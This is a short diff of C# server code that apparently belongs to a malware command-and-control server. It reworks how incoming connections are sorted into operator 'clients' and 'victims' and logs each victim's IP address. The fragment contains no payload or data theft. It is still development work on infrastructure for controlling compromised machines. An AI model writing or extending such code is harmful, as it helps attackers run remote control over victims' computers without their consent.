@@ -49,7 +49,6 @@ namespace Wubalubadubdub_Server
         private static void AcceptCallback(IAsyncResult asyncResult)
         {
             Socket socket;
-            Boolean isClient = false;
 
             try
             {
@@ -59,9 +58,10 @@ namespace Wubalubadubdub_Server
             {
                 return;
             }
-            socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
-            
-            if (isClient)
+            socket.Receive(buffer);
+            string text = Encoding.ASCII.GetString(buffer);
+
+            if (text.Equals("client"))
             {
                 clients.Add(socket);
                 Console.WriteLine("Client connected, waiting for request...");
@@ -69,8 +69,10 @@ namespace Wubalubadubdub_Server
             else
             {
                 victims.Add(socket);
-                Console.WriteLine("Victim connected at "+socket.RemoteEndPoint.ToString());
+                Console.WriteLine("Victim connected at "+socket.RemoteEndPoint.ToString().Split(':')[0]);
             }
+            
+            socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
             serverSocket.BeginAccept(AcceptCallback, null);
         }
 
